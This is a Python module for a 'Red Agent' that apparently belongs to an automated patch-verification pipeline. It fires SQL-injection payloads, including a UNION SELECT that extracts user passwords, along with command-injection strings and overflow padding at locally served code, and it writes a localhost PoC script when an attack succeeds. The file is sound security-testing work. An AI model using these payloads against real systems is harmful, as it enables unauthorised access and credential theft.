from app.models.state import RemediationState
from app.services.llm import llm_service
from app.core.test_harness import test_harness
from app.services.logger import get_logger
import os

PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "admin' /*",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION SELECT 1,username,password,active,data FROM users WHERE username='admin' --"
]

def red_agent(state: RemediationState) -> RemediationState:
    """
    Red Agent: Simulates an attack on the vulnerable code.
    Iterates through payloads and attempts to bypass patching.
    """
    logger = get_logger(state.workflow_id)
    logger.log_event("Red Agent", "Attacking", {"message": "Starting attack simulation"})
    
    if not os.path.exists(state.code_path):
        logger.log_event("Red Agent", "Error", {"error": f"File {state.code_path} not found."})
        state.exploit_success = False
        return state

    logger.log_event("Red Agent", "Execution", {"message": f"Executing payloads against {state.code_path} via TestHarness..."})
    test_harness.start_server(code_path=state.code_path, vulnerability_type=state.vulnerability_type)
    
    success = False
    successful_payload = None
    
    if state.vulnerability_type == "RCE (Remote Code Execution)":
        payloads_to_try = [
            "127.0.0.1; echo ATTACK_SUCCESS",
            "127.0.0.1 & echo ATTACK_SUCCESS",
            "127.0.0.1 | echo ATTACK_SUCCESS"
        ]
    elif state.vulnerability_type == "Buffer Overflow":
        payloads_to_try = [
            "A" * 70,
            "A" * 120,
            "A" * 250
        ]
    else:
        payloads_to_try = PAYLOADS

    try:
        for payload in payloads_to_try:
            logger.log_event("Red Agent", "Payload Sent", {"payload": payload})
            result = test_harness.run_attack(payload, vulnerability_type=state.vulnerability_type)
            
            if result["success"]:
                logger.log_event("Red Agent", "Exploit Verified", {"flag": result['data'], "payload": payload})
                success = True
                successful_payload = payload
                break
            else:
                logger.log_event("Red Agent", "Payload Failed", {"output": result.get('data'), "error": result.get('error')})
                
    finally:
        test_harness.stop_server()

    if success:
        state.exploit_success = True
        state.exploit_payloads.append(successful_payload)
        
        endpoint = "/analyze"
        if state.vulnerability_type == "RCE (Remote Code Execution)":
            endpoint = "/analyze_rce"
        elif state.vulnerability_type == "Buffer Overflow":
            endpoint = "/analyze_bof"
            
        poc_content = f"""import requests

# Auto-generated PoC exploit by Red Agent
url = "http://localhost:5000{endpoint}"
payload = {{"username": "{successful_payload}", "request_id": "poc_1"}}
try:
    response = requests.post(url, json=payload, timeout=5)
    print("Status:", response.status_code)
    print("Response:", response.json())
except Exception as e:
    print("Error:", e)
"""
        poc_path = os.path.join(os.path.dirname(state.code_path), "poc_exploit.py")
        with open(poc_path, "w") as f:
            f.write(poc_content)
            
        logger.log_event("Red Agent", "PoC Generated", {"path": poc_path})
    else:
        logger.log_event("Red Agent", "Failed", {"message": "All payloads failed. Vulnerability might be patched."})
        state.exploit_success = False

    return state
